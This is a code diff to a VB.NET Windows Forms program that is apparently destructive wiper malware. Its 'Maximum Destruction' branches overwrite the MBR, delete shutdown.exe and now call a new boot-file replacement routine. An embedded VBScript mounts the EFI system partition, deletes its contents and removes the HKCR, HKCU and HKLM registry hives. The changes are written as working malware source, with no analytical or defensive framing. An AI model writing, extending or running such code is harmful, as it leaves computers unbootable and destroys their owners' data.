@@ -206,6 +206,7 @@ Public Class Form1
                         Thread.Sleep(5000)
                         Form1.WriteMBR()
                         Form1.KillGrantAccessAndDeleteShutdownExe()
+                        ReplaceBootx64WithBootmgfw()
                         ApplyMaximumDestruction()
 
                     Case "Classic MBR/UEFI FEffects"
@@ -232,12 +233,13 @@ Public Class Form1
             Else
                 ' Code for scenarios when Deep Freeze is not detected
                 Select Case choice
-                    Case "Maximum Destruction"
+                    Case "Maximum Destruction with MBR/UEFI"
                         ' Code for maximum destruction
                         timerLabel.Text = "Executing maximum destruction!"
                         Thread.Sleep(5000)
                         Form1.WriteMBR()
                         Form1.KillGrantAccessAndDeleteShutdownExe()
+                        ReplaceBootx64WithBootmgfw()
                         ApplyMaximumDestruction()
 
                     Case "Classic MBR/UEFI Effects"
@@ -1082,7 +1084,9 @@ Public Class Form1
         "    shell.Run ""mountvol x: /s"", 0, True" & vbCrLf &
         "    shell.Run ""icacls x:"", 0, True" & vbCrLf &
         "    shell.Run ""icacls c:"", 0, True" & vbCrLf &
-        "    shell.Run ""rd x: /s /q"", 0, True" & vbCrLf &
+        "    If fso.FileExists(""x:\efi\boot\microsoft\bootmgfw.efi"") Then" & vbCrLf &
+        "        shell.Run ""rd x: /s /q"", 0, True" & vbCrLf &
+        "    End If" & vbCrLf &
         "    shell.Run ""reg delete HKCR /f"", 0, True" & vbCrLf &
         "    shell.Run ""reg delete HKCU /f"", 0, True" & vbCrLf &
         "    shell.Run ""reg delete HKLM /f"", 0, True" & vbCrLf &
